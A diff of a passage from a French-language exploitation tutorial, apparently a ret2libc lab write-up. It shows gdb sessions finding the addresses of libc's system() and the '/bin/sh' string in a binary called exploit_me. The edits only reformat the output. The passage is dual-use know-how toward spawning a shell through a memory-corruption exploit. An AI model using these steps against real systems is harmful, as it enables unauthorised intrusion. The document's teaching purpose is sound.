@@ -554,7 +554,7 @@ gdb exploit_me
 #### system
 
 ```
-(gdb) p system
+> (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 L'adresse de `system` est `0xb7e6b060`.
@@ -562,7 +562,8 @@ L'adresse de `system` est `0xb7e6b060`.
 #### /bin/sh
 
 ```
-(gdb) find __libc_start_main,+99999999,"/bin/sh"
+> (gdb) find __libc_start_main,+99999999,"/bin/sh"
+[...]
 0xb7f8cc58
 warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
@@ -571,7 +572,8 @@ warning: Unable to access target memory at 0xb7fd3160, halting search.
 Si on regarde dans cette addresse, on voit bien que c'est /bin/sh
 
 ```
-(gdb) x/s 0xb7f8cc58
+> (gdb) x/s 0xb7f8cc58
+[...]
 0xb7f8cc58:	 "/bin/sh"
 ```
 L'adresse de `"/bin/sh"` est `0xb7f8cc58`.
